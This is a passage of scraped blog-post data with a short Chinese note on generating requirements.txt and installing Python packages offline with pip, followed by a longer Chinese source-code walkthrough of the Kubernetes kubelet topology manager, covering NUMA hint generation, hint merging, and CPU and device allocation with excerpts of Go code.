","permalink":"http://bingerambo.com/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/","tags":["Git"],"title":"[转载]一些 git 的常用命令"},{"categories":["Python"],"contents":"python生成requirements.txt环境打包，利用requirements.txt离线安装Python环境\npython环境，pip安装的包写入requirements.txt 1 2 3 4 5 6  #查看安装的包 pip list #把包写入到requirements.txt中 pip freeze \u0026gt; requirements.txt   pip3方式 1 2  pip3 list pip3 freeze \u0026gt; requirements.txt   离线安装 下载python环境pip包 在可连接外网的环境中，将requirements.txt中导入的包离线下载到packagesdir目录下\n1 2 3 4  packagesdir=/home/wangb/pip3_packages pip3 download -i https://pypi.douban.com/simple -d $packagesdir -r requirements.txt #pip download -d $packagesdir -r requirements.txt   离线安装下载包 将packagesdir下的下载包，拷贝到内网环境packagesdir目录下 拷贝requirements.txt 到内网环境\n执行离线安装命令\n1 2 3 4  packagesdir=/home/wangb/pip3_packages pip3 install --no-index --find-links=$packagesdir -r requirements.txt #pip install --no-index --find-links=$packagesdir -r requirements.txt   ","permalink":"http://bingerambo.com/posts/2021/01/python%E7%94%9F%E6%88%90requirements.txt%E7%8E%AF%E5%A2%83%E6%89%93%E5%8C%85/","tags":["Python"],"title":"python生成requirements.txt环境打包"},{"categories":["K8S"],"contents":"topology manager是k8s1.16版本以后kubelet中新增的子模块，并在1.18版本更新为beta版特性，按节点资源NUMA亲和性和插件资源自身拓扑亲和性策略，对作业和任务进行资源分配。本文k8s源码分析为1.20版本。\ntopology-manager设计方案 kubelet numa拓扑亲和性资源分配方案：\nKubernetes Topology Manager Moves to Beta - Align Up!\n设计方案中的资源拓扑分配例子如下：\n An example system with 2 NUMA nodes, 2 Sockets with 4 CPUs each, 2 GPUs, and 2 NICs. CPUs on Socket 0, GPU 0, and NIC 0 are all part of NUMA node 0. CPUs on Socket 1, GPU 1, and NIC 1 are all part of NUMA node 1.\n For example, consider the system in above, with the following two containers requesting resources from it:\n   Container Name CPU GPU NIC     Container0 2 1 1   Container1 2 1 1    If Container0 is the first container considered for allocation on the system, the following set of hints will be generated for the three topology-aware resource types in the spec.\n1 2 3  cpu: {{01: True}, {10: True}, {11: False}} gpu-vendor.com/gpu: {{01: True}, {10: True}} nic-vendor.com/nic: {{01: True}, {10: True}}   With a resulting aligned allocation of:\n1  {cpu: {0, 1}, gpu: 0, nic: 0}   When considering Container1 these resources are then presumed to be unavailable, and thus only the following set of hints will be generated:\n1 2 3  cpu: {{01: True}, {10: True}, {11: False}} gpu-vendor.com/gpu: {{10: True}} nic-vendor.com/nic: {{10: True}}   With a resulting aligned allocation of:\n1  {cpu: {4, 5}, gpu: 1, nic: 1}   Supporting device-specific constraints  Currently, NUMA affinity is the only constraint considered by the TopologyManager for resource alignment. Moreover, the only scalable extensions that can be made to a TopologyHint involve node-level constraints, such as PCIe bus alignment across device types. It would be intractable to try and add any device-specific constraints to this struct (e.g. the internal NVLINK topology among a set of GPU devices).\nAs such, we propose an extension to the device plugin interface that will allow a plugin to state its topology-aware allocation preferences, without having to expose any device-specific topology information to the kubelet. In this way, the TopologyManager can be restricted to only deal with common node-level topology constraints, while still having a way of incorporating device-specific topology constraints into its allocation decisions.\nDetails of this proposal can be found here, and should be available as soon as Kubernetes 1.19.\n   说明：目前，NUMA affinity是kubelet的TopologyManager唯一的资源对齐的约束条件（对齐标准），而设备可扩展拓扑约束条件只有非节点级别的。\nAdd proposal for GetPreferredAllocation() to TopologyManager KEP  This proposal adds an API to allow a device plugin to forward a \u0026ldquo;preferred allocation\u0026rdquo; to the devicemanager so it can incorporate this information into its allocation decisions. It leaves the devicemanager in charge of making the final allocation, but gives the plugin the chance to help influence it more directly.\nUsing this new API call, the devicemanager will call out to a plugin at pod admission time, asking it for a preferred device allocation of a given size from a list of available devices. One call will be made per-container for each pod.\nThe list of available devices passed to the GetPreferredAllocation() call do not necessarily match the full list of available devices on the system. Instead, the devicemanager treats the GetPreferredAllocation() call as a \u0026ldquo;last-level\u0026rdquo; filter on the set of devices it has to choose from after taking all TopologyHint information into consideration. As such, the list of available devices passed to this call will already be pre-filtered by the topology constraints encoded in the TopologyHint.\nAs such, the preferred allocation is not guaranteed to be the allocation ultimately performed by the devicemanager. It is only designed to help the devicemanager make a more informed allocation decision when possible.\nWhen deciding on a preferred allocation, a device plugin will likely take internal topology-constraints into consideration, that the devicemanager is unaware of. A good example of this is the case of allocating pairs of NVIDIA GPUs that always include an NVLINK.\nOn an 8 GPU machine, with a request for 2 GPUs, the best connected pairs by NVLINK might be:\n1  {{0,3}, {1,2}, {4,7}, {5,6}}   Using GetPreferredAllocation() the NVIDIA device plugin is able to forward one of these preferred allocations to the device manager if the appropriate set of decvices are still available. Without this extra bit of information, the devicemanager would end up picking GPUs at random from the list of GPUs available after filerting by TopologyHint. This API, therefore allows it to ultimately perform a much better allocationt , with very minimal cost.\nIf a plugin does not implement this new GetPreferredAllocation() method, then we should simply follow the strategy that exists today with no change (i.e. allocate devices directly from the available devices list).\nHowever, if GetPreferredAllocation() is implemented, then the preferred allocation should be chosen over simply pulling devices at random from the available devices list.\nThere are 4 cases to consider:\n TopologyManager disabled, GetPreferredAllocation() not implemented TopologyManager enabled, GetPreferredAllocation() not implemented TopologyManager disabled, GetPreferredAllocation() implemented TopologyManager enabled, GetPreferredAllocation() implemented  With the TopologyManager disabled and GetPreferredAllocation() unimplemented, the existing strategy is to simply pull devices from the front of the available devices list \u0026ndash; this should go unchanged.\nWith the TopologyManager enabled and GetPreferredAllocation() unimplemented, the existing strategy is to pull devices from the available devices list, such that they have the desired NUMA affinity \u0026ndash; this should also go unchanged.\nWith the TopologyManager disabled and GetPreferredAllocation() implemented, the new strategy should be to prefer allocations from the list returned by GetPreferredAllocation() if possible, and fall back to pulling devices from the front of the available devices list if not.\nWith the TopologyManager enabled and GetPreferredAllocation() implemented, the new strategy should be to prefer allocations from the list returned by GetPreferredAllocation() such that they have the desired NUMA affinity presented by the TopologyManager.\nIf that is not possible, fall back to pulling devices at random from the available devices list, such that they have the desired NUMA affinity. In this way, we will always follow a best-effort policy for honoring preferred allocations specified by this interface. We will NOT fail pod admission due to it.\n   流程 在分析源码前，先整理画出相关流程时序图。便于总体理解业务流程。如下\n资源管理组件创建和device plugin注册流程 这里以nvidia-k8s-deviceplugin为例，说明GPU设备注册流程\nkubelet分配资源流程 kubelet根据topology manager计算资源拓扑亲和性，并由cpu manager分配cpu资源；device manager分配插件资源\n主流程代码 kubelet/cm/topologymanager/scope_container.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  func (s *containerScope) Admit(pod *v1.Pod) lifecycle.PodAdmitResult { if s.policy.Name() == PolicyNone { return s.admitPolicyNone(pod) } for _, container := range append(pod.Spec.InitContainers, pod.Spec.Containers...) { // bestHint, admit := s.calculateAffinity(pod, \u0026amp;container)  providersHints := s.accumulateProvidersHints(pod, container) bestHint, admit := s.policy.Merge(providersHints) if !admit { return topologyAffinityError() } if (s.podTopologyHints)[string(pod.UID)] == nil { (s.podTopologyHints)[string(pod.UID)] = make(map[string]TopologyHint) } klog.Infof(\u0026#34;[topologymanager] Topology Affinity for (pod: %v container: %v): %v\u0026#34;, format.Pod(pod), container.Name, bestHint) (s.podTopologyHints)[string(pod.UID)][container.Name] = bestHint err := s.allocateAlignedResources(pod, \u0026amp;container) if err != nil { return unexpectedAdmissionError(err) } } return admitPod() }    遍历pod中的所有容器 计算ProvidersHints，获取分配方案建议bestHint, 结果admit 按上面的对齐分配方案，为pod分配资源  参考数据结构\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60  // Scope interface for Topology Manager type Scope interface { Name() string Admit(pod *v1.Pod) lifecycle.PodAdmitResult // AddHintProvider adds a hint provider to manager to indicate the hint provider  // wants to be consoluted with when making topology hints  AddHintProvider(h HintProvider) // AddContainer adds pod to Manager for tracking  AddContainer(pod *v1.Pod, containerID string) error // RemoveContainer removes pod from Manager tracking  RemoveContainer(containerID string) error // Store is the interface for storing pod topology hints  Store } type scope struct { mutex sync.Mutex name string // Mapping of a Pods mapping of Containers and their TopologyHints  // Indexed by PodUID to ContainerName  podTopologyHints podTopologyHints // The list of components registered with the Manager  hintProviders []HintProvider // Topology Manager Policy  policy Policy // Mapping of PodUID to ContainerID for Adding/Removing Pods from PodTopologyHints mapping  podMap map[string]string } // 格式: map[string(pod.UID)][container.Name]TopologyHint type podTopologyHints map[string]map[string]TopologyHint // TopologyHint is a struct containing the NUMANodeAffinity for a Container type TopologyHint struct { NUMANodeAffinity bitmask.BitMask // Preferred is set to true when the NUMANodeAffinity encodes a preferred  // allocation for the Container. It is set to false otherwise.  Preferred bool } // HintProvider is an interface for components that want to collaborate to // achieve globally optimal concrete resource alignment with respect to // NUMA locality. type HintProvider interface { // GetTopologyHints returns a map of resource names to a list of possible  // concrete resource allocations in terms of NUMA locality hints. Each hint  // is optionally marked \u0026#34;preferred\u0026#34; and indicates the set of NUMA nodes  // involved in the hypothetical allocation. The topology manager calls  // this function for each hint provider, and merges the hints to produce  // a consensus \u0026#34;best\u0026#34; hint. The hint providers may subsequently query the  // topology manager to influence actual resource assignment.  GetTopologyHints(pod *v1.Pod, container *v1.Container) map[string][]TopologyHint // GetPodTopologyHints returns a map of resource names to a list of possible  // concrete resource allocations per Pod in terms of NUMA locality hints.  GetPodTopologyHints(pod *v1.Pod) map[string][]TopologyHint // Allocate triggers resource allocation to occur on the HintProvider after  // all hints have been gathered and the aggregated Hint is available via a  // call to Store.GetAffinity().  Allocate(pod *v1.Pod, container *v1.Container) error }   topology affinity hintProviders实际上为参与进行资源分配的资源管理器，其扩展topo计算接口，目前使用的是cpumanger和devicemanager\n cpumanger用于管理分配cpu资源，比如按static策略分配cpuset devicemanager用于管理分配k8s可扩展资源，比如k8s-nvidia-gpu插件管理的gpu资源  1 2 3 4 5 6 7 8 9 10 11 12  func (s *containerScope) accumulateProvidersHints(pod *v1.Pod, container *v1.Container) []map[string][]TopologyHint { var providersHints []map[string][]TopologyHint // hintProviders实际上为参与进行资源分配的资源管理器，其扩展topo计算接口，目前使用的是cpumanger和devicemanager  for _, provider := range s.hintProviders { // Get the TopologyHints for a Container from a provider.  hints := provider.GetTopologyHints(pod, container) providersHints = append(providersHints, hints) klog.Infof(\u0026#34;[topologymanager] TopologyHints for pod \u0026#39;%v\u0026#39;, container \u0026#39;%v\u0026#39;: %v\u0026#34;, format.Pod(pod), container.Name, hints) } return providersHints }   cpumanager cpumanager ：GetTopologyHints -\u0026gt; m.policy.GetTopologyHints(m.state, pod, container)[staticPolicy.GetTopologyHints] -\u0026gt; generateCPUTopologyHints(available, reusable, requested)\n 计算并返回cpu资源的TopologyHint列表信息  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  func (p *staticPolicy) GetTopologyHints(){ // Get a list of available CPUs.  available := p.assignableCPUs(s) // Get a list of reusable CPUs (e.g. CPUs reused from initContainers).  // It should be an empty CPUSet for a newly created pod.  reusable := p.cpusToReuse[string(pod.UID)] // Generate hints.  cpuHints := p.generateCPUTopologyHints(available, reusable, requested) // 返回cpu资源的TopologyHint列表信息  return map[string][]topologymanager.TopologyHint{ // \u0026#34;cpu\u0026#34; : [{01 true} {10 true} {11 false}]  string(v1.ResourceCPU): cpuHints, } }   计算cpu Hints generateCPUTopologyHints  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  func (p *staticPolicy) generateCPUTopologyHints(availableCPUs cpuset.CPUSet, reusableCPUs cpuset.CPUSet, request int) []topologymanager.TopologyHint { // Initialize minAffinitySize to include all NUMA Nodes.  minAffinitySize := p.topology.CPUDetails.NUMANodes().Size() // 执行了具体计算topo hint的算法  bitmask.IterateBitMasks(topology.CPUDetails.NUMANodes().ToSlice(), call_back_func{}) // If they don\u0026#39;t, then move onto the next combination.  if numMatching \u0026lt; request { return } // Loop back through all hints and update the \u0026#39;Preferred\u0026#39; field based on  // counting the number of bits sets in the affinity mask and comparing it  // to the minAffinitySize. Only those with an equal number of bits set (and  // with a minimal set of numa nodes) will be considered preferred.  for i := range hints { // 选择bitmap最窄的NUMANode，Preferred = true  if hints[i].NUMANodeAffinity.Count() == minAffinitySize { hints[i].Preferred = true } } // 返回hints结果集，形式如：[{01 true} {10 true} {11 false}]  // Preferred 优选字段标识 该hint是否为优先考虑方案  return hints }   devicemanager  GetTopologyHints  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  // GetTopologyHints implements the TopologyManager HintProvider Interface which // ensures the Device Manager is consulted when Topology Aware Hints for each // container are created. func (m *ManagerImpl) GetTopologyHints(pod *v1.Pod, container *v1.Container) map[string][]topologymanager.TopologyHint { // Garbage collect any stranded device resources before providing TopologyHints  m.UpdateAllocatedDevices() // Loop through all device resources and generate TopologyHints for them..  deviceHints := make(map[string][]topologymanager.TopologyHint) for resourceObj, requestedObj := range container.Resources.Limits { resource := string(resourceObj) requested := int(requestedObj.Value()) // Only consider resources associated with a device plugin.  // 只考虑device plugin的扩展资源  if m.isDevicePluginResource(resource) { // Only consider devices that actually container topology information.  // 只考虑有拓扑信息的资源，比如按numa对齐的gpus  if aligned := m.deviceHasTopologyAlignment(resource)!aligned { klog.Infof(\u0026#34;[devicemanager] Resource \u0026#39;%v\u0026#39; does not have a topology preference\u0026#34;, resource) deviceHints[resource] = nil continue } // Get the list of available devices, for which TopologyHints should be generated.  available := m.getAvailableDevices(resource) reusable := m.devicesToReuse[string(pod.UID)][resource] // Generate TopologyHints for this resource given the current  // request size and the list of available devices.  deviceHints[resource] = m.generateDeviceTopologyHints(resource, available, reusable, requested) } } return deviceHints }   计算device Hints generateDeviceTopologyHints  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  func (m *ManagerImpl) generateDeviceTopologyHints(resource string, available sets.String, reusable sets.String, request int) []topologymanager.TopologyHint { // Initialize minAffinitySize to include all NUMA Nodes  minAffinitySize := len(m.numaNodes) // Iterate through all combinations of NUMA Nodes and build hints from them.  hints := []topologymanager.TopologyHint{} bitmask.IterateBitMasks(m.numaNodes, call_back_func{}) // Loop back through all hints and update the \u0026#39;Preferred\u0026#39; field based on  // counting the number of bits sets in the affinity mask and comparing it  // to the minAffinity. Only those with an equal number of bits set will be  // considered preferred.  for i := range hints { if hints[i].NUMANodeAffinity.Count() == minAffinitySize { hints[i].Preferred = true } } return hints }   merge hints merge算法思想 merge思想，是把多种类型资源的topo hints（即下面中的每一行），合并为一个hint，合并算法为位与运算。\n不同的topo policy实现，区别就在merge处理中，如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  func (p *nonePolicy) Merge(providersHints []map[string][]TopologyHint) (TopologyHint, bool) { return TopologyHint{}, p.canAdmitPodResult(nil) } func (p *bestEffortPolicy) Merge(providersHints []map[string][]TopologyHint) (TopologyHint, bool) { // 1. 遍历全部hint providers，收集全部的hint，到filteredProvidersHints列表中。  // 本质上，是把map数据，转换成二维列表[][]TopologyHint，目的便于后面的mergeFilteredHints处理  filteredProvidersHints := filterProvidersHints(providersHints) bestHint := mergeFilteredHints(p.numaNodes, filteredProvidersHints) admit := p.canAdmitPodResult(\u0026amp;bestHint) return bestHint, admit } func (p *restrictedPolicy) Merge(providersHints []map[string][]TopologyHint) (TopologyHint, bool) { filteredHints := filterProvidersHints(providersHints) hint := mergeFilteredHints(p.numaNodes, filteredHints) admit := p.canAdmitPodResult(\u0026amp;hint) return hint, admit } func (p *singleNumaNodePolicy) Merge(providersHints []map[string][]TopologyHint) (TopologyHint, bool) { filteredHints := filterProvidersHints(providersHints) // Filter to only include don\u0026#39;t cares and hints with a single NUMA node.  singleNumaHints := filterSingleNumaHints(filteredHints) bestHint := mergeFilteredHints(p.numaNodes, singleNumaHints) defaultAffinity, _ := bitmask.NewBitMask(p.numaNodes...) if bestHint.NUMANodeAffinity.IsEqual(defaultAffinity) { bestHint = TopologyHint{nil, bestHint.Preferred} } admit := p.canAdmitPodResult(\u0026amp;bestHint) return bestHint, admit }   mergeFilteredHints处理 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  func mergeFilteredHints(numaNodes []int, filteredHints [][]TopologyHint) TopologyHint { // Set the default affinity as an any-numa affinity containing the list  // of NUMA Nodes available on this machine.  defaultAffinity, _ := bitmask.NewBitMask(numaNodes...) // Set the bestHint to return from this function as {nil false}.  // This will only be returned if no better hint can be found when  // merging hints from each hint provider.  bestHint := TopologyHint{defaultAffinity, false} // 计算merge结果  iterateAllProviderTopologyHints(filteredHints, call_back_func{}) return bestHint }   mergePermutation处理  应用了向量叉积(Cross Product)，但只是组合排列，并未求和 permutation为iterateAllProviderTopologyHints中罗列出的各种资源类型的hints的全部排列 位与运算bitmask.And，计算besthint值mergedAffinity hint.Preferred 逻辑与关系，全部为true，则为true。否则为false  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  // Merge a TopologyHints permutation to a single hint by performing a bitwise-AND // of their affinity masks. The hint shall be preferred if all hits in the permutation // are preferred. func mergePermutation(numaNodes []int, permutation []TopologyHint) TopologyHint { // Get the NUMANodeAffinity from each hint in the permutation and see if any  // of them encode unpreferred allocations.  preferred := true defaultAffinity, _ := bitmask.NewBitMask(numaNodes...) var numaAffinities []bitmask.BitMask for _, hint := range permutation { // Only consider hints that have an actual NUMANodeAffinity set.  if hint.NUMANodeAffinity == nil { numaAffinities = append(numaAffinities, defaultAffinity) } else { numaAffinities = append(numaAffinities, hint.NUMANodeAffinity) } if !hint.Preferred { preferred = false } } // Merge the affinities using a bitwise-and operation.  mergedAffinity := bitmask.And(defaultAffinity, numaAffinities...) // Build a mergedHint from the merged affinity mask, indicating if an  // preferred allocation was used to generate the affinity mask or not.  return TopologyHint{mergedAffinity, preferred} }   bestHint kubelet会再次遍历merged hint，得出bestHint，最终按bestHint进行资源分配。\nbestHint算法思想：\n 优选preference为true的merge hint，即mergedHint.Preferred: true 在相同preference条件下，优选长度最窄的NUMANodeAffinity（bitmap类型）  计算好bestHint后，并保存，为后面流程使用\n1  (s.podTopologyHints)[string(pod.UID)][container.Name] = bestHint   小结：\nhints的合并流程：resource topo hints -\u0026gt; merged hints -\u0026gt; bestHint\n算法函数 计算BitMasks 组合 资源单元的分配是一种寻找组合的算法\nbits列表即为NUMANodes返回与资源(如cpu)相关联的所有NUMANode id列表\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  // IterateBitMasks iterates all possible masks from a list of bits, // issuing a callback on each mask. func IterateBitMasks(bits []int, callback func(BitMask)) { var iterate func(bits, accum []int, size int) iterate = func(bits, accum []int, size int) { if len(accum) == size { // 构建size个numa组的bits按位或得到的mask，比如size=2时，输出numa组id组合：{01,10,11}  mask, _ := NewBitMask(accum...) // callback 会对获得的各种长度的numa node mask进程处理  callback(mask) return } // 组合，遍历可选numa的bits列表  for i := range bits { iterate(bits[i+1:], append(accum, bits[i]), size) } } // bits列表即为NUMANodes返回与资源(如cpu)相关联的所有NUMANode id列表，如：[0,1]或者[0,1,2...7]或者 [0,1,2,3....63]  // 并枚举1到全部numa node长度的numa node id 组合  for i := 1; i \u0026lt;= len(bits); i++ { iterate(bits, []int{}, i) } }     IterateBitMasks是计算topo hint的关键函数，在cpumangager和devicemanager中都有使用\n  IterateBitMasks本质上是计算出了资源列表（bits选择列表）的全部组合（size大小），如：cpuset的各种组合；devices中gpus的各种组合\n  DFS算法\n  计算AllProviderTopologyHints 排列 不同资源类型的hits合并，是全排列算法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  // Iterate over all permutations of hints in \u0026#39;allProviderHints [][]TopologyHint\u0026#39;. // // This procedure is implemented as a recursive function over the set of hints // in \u0026#39;allproviderHints[i]\u0026#39;. It applies the function \u0026#39;callback\u0026#39; to each // permutation as it is found. It is the equivalent of: // // for i := 0; i \u0026lt; len(providerHints[0]); i++ // for j := 0; j \u0026lt; len(providerHints[1]); j++ // for k := 0; k \u0026lt; len(providerHints[2]); k++ // ... // for z := 0; z \u0026lt; len(providerHints[-1]); z++ // permutation := []TopologyHint{ // providerHints[0][i], // providerHints[1][j], // providerHints[2][k], // ... // providerHints[-1][z] // } // callback(permutation) func iterateAllProviderTopologyHints(allProviderHints [][]TopologyHint, callback func([]TopologyHint)) { // Internal helper function to accumulate the permutation before calling the callback.  var iterate func(i int, accum []TopologyHint) iterate = func(i int, accum []TopologyHint) { // Base case: we have looped through all providers and have a full permutation.  if i == len(allProviderHints) { callback(accum) return } // Loop through all hints for provider \u0026#39;i\u0026#39;, and recurse to build the  // the permutation of this hint with all hints from providers \u0026#39;i++\u0026#39;.  for j := range allProviderHints[i] { iterate(i+1, append(accum, allProviderHints[i][j])) } } iterate(0, []TopologyHint{}) }   资源分配 allocateAlignedResources 1 2 3 4 5 6 7 8 9 10 11  // It would be better to implement this function in topologymanager instead of scope // but topologymanager do not track providers anymore func (s *scope) allocateAlignedResources(pod *v1.Pod, container *v1.Container) error { for _, provider := range s.hintProviders { err := provider.Allocate(pod, container) if err != nil { return err } } return nil }   cpumanger 根据前面计算出的topo hint 进行cpu分配\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  func (p *staticPolicy) Allocate(s state.State, pod *v1.Pod, container *v1.Container) error { if numCPUs := p.guaranteedCPUs(pod, container); numCPUs != 0 { // Call Topology Manager to get the aligned socket affinity across all hint providers.  hint := p.affinity.GetAffinity(string(pod.UID), container.Name) // Allocate CPUs according to the NUMA affinity contained in the hint.  cpuset, err := p.allocateCPUs(s, numCPUs, hint.NUMANodeAffinity, p.cpusToReuse[string(pod.UID)]) s.SetCPUSet(string(pod.UID), container.Name, cpuset) p.updateCPUsToReuse(pod, container, cpuset) } // container belongs in the shared pool (nothing to do; use default cpuset)  return nil }   devicemanger devicemanger的资源分配逻辑处理逻辑较多。首先看下调用链，如下：\nAllocate -\u0026gt; allocateContainerResources -\u0026gt; devicesToAllocate\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93  // Returns list of device Ids we need to allocate with Allocate rpc call. // Returns empty list in case we don\u0026#39;t need to issue the Allocate rpc call. func (m *ManagerImpl) devicesToAllocate(podUID, contName, resource string, required int, reusableDevices sets.String) (sets.String, error) { // Declare the list of allocated devices.  // This will be populated and returned below.  allocated := sets.NewString() // Create a closure to help with device allocation  // Returns \u0026#39;true\u0026#39; once no more devices need to be allocated.  allocateRemainingFrom := func(devices sets.String) bool { for device := range devices.Difference(allocated) { m.allocatedDevices[resource].Insert(device) allocated.Insert(device) needed-- if needed == 0 { return true } } return false } // Allocates from reusableDevices list first.  if allocateRemainingFrom(reusableDevices) { return allocated, nil } // Needs to allocate additional devices.  if m.allocatedDevices[resource] == nil { m.allocatedDevices[resource] = sets.NewString() } // Gets Devices in use.  devicesInUse := m.allocatedDevices[resource] // Gets Available devices.  available := m.healthyDevices[resource].Difference(devicesInUse) if available.Len() \u0026lt; needed { return nil, fmt.Errorf(\u0026#34;requested number of devices unavailable for %s. Requested: %d, Available: %d\u0026#34;, resource, needed, available.Len()) } // Filters available Devices based on NUMA affinity.  aligned, unaligned, noAffinity := m.filterByAffinity(podUID, contName, resource, available) // If we can allocate all remaining devices from the set of aligned ones, then  // give the plugin the chance to influence which ones to allocate from that set.  if needed \u0026lt; aligned.Len() { // First allocate from the preferred devices list (if available).  preferred, err := m.callGetPreferredAllocationIfAvailable(podUID, contName, resource, aligned.Union(allocated), allocated, required) if err != nil { return nil, err } if allocateRemainingFrom(preferred.Intersection(aligned)) { return allocated, nil } // Then fallback to allocate from the aligned set if no preferred list  // is returned (or not enough devices are returned in that list).  if allocateRemainingFrom(aligned) { return allocated, nil } return nil, fmt.Errorf(\u0026#34;unexpectedly allocated less resources than required. Requested: %d, Got: %d\u0026#34;, required, required-needed) } // If we can\u0026#39;t allocate all remaining devices from the set of aligned ones,  // then start by first allocating all of the aligned devices (to ensure  // that the alignment guaranteed by the TopologyManager is honored).  if allocateRemainingFrom(aligned) { return allocated, nil } // Then give the plugin the chance to influence the decision on any  // remaining devices to allocate.  preferred, err := m.callGetPreferredAllocationIfAvailable(podUID, contName, resource, available.Union(allocated), allocated, required) if err != nil { return nil, err } if allocateRemainingFrom(preferred.Intersection(available)) { return allocated, nil } // Finally, if the plugin did not return a preferred allocation (or didn\u0026#39;t  // return a large enough one), then fall back to allocating the remaining  // devices from the \u0026#39;unaligned\u0026#39; and \u0026#39;noAffinity\u0026#39; sets.  if allocateRemainingFrom(unaligned) { return allocated, nil } if allocateRemainingFrom(noAffinity) { return allocated, nil } return nil, fmt.Errorf(\u0026#34;unexpectedly allocated less resources than required. Requested: %d, Got: %d\u0026#34;, required, required-needed) }   numa亲和性分配主要在filterByAffinity中\n 构造了perNodeDevices map对象: map[numaid]deivces 构造返回结果集：sets.NewString(fromAffinity\u0026hellip;), sets.NewString(notFromAffinity\u0026hellip;), sets.NewString(withoutTopology\u0026hellip;), 即 基于numa亲和性从available资源中过滤出：aligned, unaligned, noAffinity  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69  func (m *ManagerImpl) filterByAffinity(podUID, contName, resource string, available sets.String) (sets.String, sets.String, sets.String) { // Build a map of NUMA Nodes to the devices associated with them. A  // device may be associated to multiple NUMA nodes at the same time. If an  // available device does not have any NUMA Nodes associated with it, add it  // to a list of NUMA Nodes for the fake NUMANode -1.  perNodeDevices := make(map[int]sets.String) nodeWithoutTopology := -1 for d := range available { if m.allDevices[resource][d].Topology == nil || len(m.allDevices[resource][d].Topology.Nodes) == 0 { if _, ok := perNodeDevices[nodeWithoutTopology]; !ok { perNodeDevices[nodeWithoutTopology] = sets.NewString() } perNodeDevices[nodeWithoutTopology].Insert(d) continue } for _, node := range m.allDevices[resource][d].Topology.Nodes { if _, ok := perNodeDevices[int(node.ID)]; !ok { perNodeDevices[int(node.ID)] = sets.NewString() } perNodeDevices[int(node.ID)].Insert(d) } } // Get a flat list of all of the nodes associated with available devices.  var nodes []int for node := range perNodeDevices { nodes = append(nodes, node) } // Sort the list of nodes by how many devices they contain.  sort.Slice(nodes, func(i, j int) bool { return perNodeDevices[i].Len() \u0026lt; perNodeDevices[j].Len() }) // Generate three sorted lists of devices. Devices in the first list come  // from valid NUMA Nodes contained in the affinity mask. Devices in the  // second list come from valid NUMA Nodes not in the affinity mask. Devices  // in the third list come from devices with no NUMA Node association (i.e.  // those mapped to the fake NUMA Node -1). Because we loop through the  // sorted list of NUMA nodes in order, within each list, devices are sorted  // by their connection to NUMA Nodes with more devices on them.  var fromAffinity []string var notFromAffinity []string var withoutTopology []string for d := range available { // Since the same device may be associated with multiple NUMA Nodes. We  // need to be careful not to add each device to multiple lists. The  // logic below ensures this by breaking after the first NUMA node that  // has the device is encountered.  for _, n := range nodes { if perNodeDevices[n].Has(d) { if n == nodeWithoutTopology { withoutTopology = append(withoutTopology, d) } else if hint.NUMANodeAffinity.IsSet(n) { fromAffinity = append(fromAffinity, d) } else { notFromAffinity = append(notFromAffinity, d) } break } } } // Return all three lists containing the full set of devices across them.  return sets.NewString(fromAffinity...), sets.NewString(notFromAffinity...), sets.NewString(withoutTopology...) }   这里kubelet会调用grpc接口，通知插件按topo建议方案进行资源分配计算（此时插件并未真正分配资源）。这里的分配方案只是建议。 把上面的代码摘取出跟分配相关的处理，如果分配成功，则返回allocated, nil。如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  // If we can allocate all remaining devices from the set of aligned ones, then  // give the plugin the chance to influence which ones to allocate from that set.  if needed \u0026lt; aligned.Len() { // First allocate from the preferred devices list (if available).  preferred, err := m.callGetPreferredAllocationIfAvailable(podUID, contName, resource, aligned.Union(allocated), allocated, required) if err != nil { return nil, err } if allocateRemainingFrom(preferred.Intersection(aligned)) { return allocated, nil } // Then fallback to allocate from the aligned set if no preferred list  // is returned (or not enough devices are returned in that list).  if allocateRemainingFrom(aligned) { return allocated, nil } return nil, fmt.Errorf(\u0026#34;unexpectedly allocated less resources than required. Requested: %d, Got: %d\u0026#34;, required, required-needed) } // If we can\u0026#39;t allocate all remaining devices from the set of aligned ones,  // then start by first allocating all of the aligned devices (to ensure  // that the alignment guaranteed by the TopologyManager is honored).  if allocateRemainingFrom(aligned) { return allocated, nil } preferred, err := m.callGetPreferredAllocationIfAvailable(podUID, contName, resource, available.Union(allocated), allocated, required)   callGetPreferredAllocationIfAvailable 参数说明：\n mustInclude：allocated，allocated是根据allocateRemainingFrom(reusableDevices)，从可重用device list中获取的设备资源 